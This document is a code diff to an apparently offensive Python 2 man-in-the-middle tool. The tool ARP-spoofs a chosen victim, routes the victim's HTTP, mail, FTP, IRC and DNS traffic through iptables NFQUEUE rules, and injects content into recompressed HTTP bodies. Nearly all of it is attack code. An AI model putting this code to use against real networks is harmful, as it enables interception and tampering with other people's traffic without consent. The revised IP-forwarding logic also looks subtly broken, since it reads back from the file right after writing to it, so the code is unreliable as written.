@@ -293,9 +293,9 @@ class Parser():
 			# Recompress data if necessary
 			if 'Content-Encoding: gzip' in headers:
 				if body != '':
-					#debugger = open('injectedBody', 'w') #########################################
-					#debugger.write(body) #########################################
-					#debugger.close() #########################################
+#					debugger = open('injectedBody', 'w') #########################################
+#					debugger.write(body) #########################################
+#					debugger.close() #########################################
 					try:
 						comp_body = StringIO()
 						f = gzip.GzipFile(fileobj=comp_body, mode='w', compresslevel = 9)
@@ -758,7 +758,7 @@ class Queued(object):
 	def fileno(self):
 		return self.q.get_fd()
 	def doRead(self):
-		self.q.process_pending(5)
+		self.q.process_pending(100) # if I lower this to, say, 5, it hurts injection's reliability
 	def connectionLost(self, reason):
 		reactor.removeReader(self)
 	def logPrefix(self):
@@ -855,9 +855,9 @@ class active_users():
 						a.append(nbtname)
 
 		# Start monitor mode
-		print '[*] Enabling monitor mode [/usr/sbin/airmon-ng ' + 'start ' + interface + ']'
+		print '[*] Enabling monitor mode [airmon-ng ' + 'start ' + interface + ']'
 		try:
-			promiscSearch = Popen(['/usr/sbin/airmon-ng', 'start', '%s' % interface], stdout=PIPE, stderr=DN)
+			promiscSearch = Popen(['airmon-ng', 'start', '%s' % interface], stdout=PIPE, stderr=DN)
 			promisc = promiscSearch.communicate()[0]
 			monmodeSearch = re.search('monitor mode enabled on (.+)\)', promisc)
 			self.monmode = monmodeSearch.group(1)
@@ -880,8 +880,6 @@ def print_vars(DHCPsrvr, dnsIP, local_domain, routerIP, victimIP):
 
 #Enable IP forwarding and flush possibly conflicting iptables rules
 def setup(victimMAC):
-	open('/proc/sys/net/ipv4/ip_forward', 'w').write('1\n')
-	print '[*] Enabled IP forwarding'
 	os.system('/sbin/iptables -F')
 	os.system('/sbin/iptables -X')
 	os.system('/sbin/iptables -t nat -F')
@@ -893,6 +891,10 @@ def setup(victimMAC):
 	os.system('/sbin/iptables -A FORWARD -p tcp -d %s -m multiport --sports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
 	# To catch DNS packets you gotta do prerouting rather than forward for some reason?
 	os.system('/sbin/iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
+	with open('/proc/sys/net/ipv4/ip_forward', 'r+') as ipf:
+		ipf.write('1\n')
+		print '[*] Enabled IP forwarding'
+		return ipf.read()
 
 # Start threads
 def threads(args):
@@ -989,7 +991,7 @@ def main(args):
 		au = active_users()
 		au.users(IPprefix, routerIP)
 		print '\n[*] Turning off monitor mode'
-		os.system('/usr/sbin/airmon-ng stop %s >/dev/null 2>&1' % au.monmode)
+		os.system('airmon-ng stop %s >/dev/null 2>&1' % au.monmode)
 		try:
 			victimIP = raw_input('[*] Enter the non-router IP to spoof: ')
 		except KeyboardInterrupt:
@@ -1078,7 +1080,7 @@ def main(args):
 			dnsMAC = None
 
 
-	setup(victimMAC)
+	ipf = setup(victimMAC)
 	Queued(args)
 	threads(args)
 
@@ -1101,7 +1103,8 @@ def main(args):
 	def signal_handler(signal, frame):
 		print 'learing iptables, sending healing packets, and turning off IP forwarding...'
 		logger.close()
-		open('/proc/sys/net/ipv4/ip_forward', 'w').write('0\n')
+		with open('/proc/sys/net/ipv4/ip_forward', 'r+') as forward:
+			forward.write(ipf)
 		if not dnsIP == routerIP and dnsMAC:
 			Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
 			Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
